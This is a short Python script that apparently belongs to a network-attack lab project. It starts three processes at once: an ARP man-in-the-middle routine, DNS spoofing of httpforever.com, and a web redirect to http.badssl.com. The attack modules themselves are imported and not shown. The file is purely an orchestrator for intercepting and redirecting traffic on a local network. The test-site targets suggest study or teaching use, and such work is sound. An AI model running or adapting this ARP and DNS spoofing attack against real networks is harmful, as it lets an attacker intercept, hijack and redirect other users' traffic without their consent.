from arp import middleManARP
from dns import dnsSpoofin
from webRedirect import redirection
import multiprocessing

if __name__ == "__main__":
    p1 = multiprocessing.Process(target=middleManARP)
    p2 = multiprocessing.Process(target=dnsSpoofin, args=(b"httpforever.com.",))
    p3 = multiprocessing.Process(target=redirection, args=('http://http.badssl.com',))
    
    try:
        p1.start()
        p2.start()
        p3.start()
        
        p1.join()
        p2.join()
        p3.join()
    except KeyboardInterrupt:
        p1.terminate()
        p2.terminate()
        p3.terminate()
        
        p1.join()
        p2.join()
        p3.join()